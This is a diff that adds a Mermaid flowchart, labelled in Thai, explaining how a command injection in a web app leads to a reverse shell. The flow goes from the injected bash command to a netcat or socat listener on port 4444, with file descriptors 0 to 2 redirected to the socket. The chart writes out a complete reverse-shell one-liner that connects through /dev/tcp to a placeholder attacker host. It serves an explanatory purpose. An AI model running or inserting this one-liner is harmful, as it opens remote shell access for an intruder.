@@ -1,0 +1,25 @@
+---
+config:
+  flowchart:
+    wrappingWidth: 420
+---
+flowchart LR
+    subgraph VICTIM["เครื่องเหยื่อ (ถูกเจาะ)"]
+        WA["① web app"]
+        BASH["② bash -c<br/>'exec 3#lt;#gt;/dev/tcp/ATK/4444;<br/>exec sh #lt;&3 #gt;&3 2#gt;&3'"]
+        SH["④ sh:<br/>fd0 = socket<br/>fd1 = socket<br/>fd2 = socket"]
+    end
+
+    subgraph ATTACK["เครื่องผู้โจมตี"]
+        L["③ listener :4444<br/>(nc -l / socat)"]
+    end
+
+    WA -- "command<br/>injection" --> BASH
+    BASH -- "TCP" --> L
+    L -- "พิมพ์คำสั่ง → fd0" --> SH
+    SH -- "fd1 → เห็นผลลัพธ์" --> L
+
+    classDef kern fill:#ffe4e6,stroke:#e11d48,stroke-width:2px,color:#0f172a
+    classDef user fill:#dbeafe,stroke:#2563eb,stroke-width:2px,color:#0f172a
+    class WA,BASH,SH user
+    class L kern
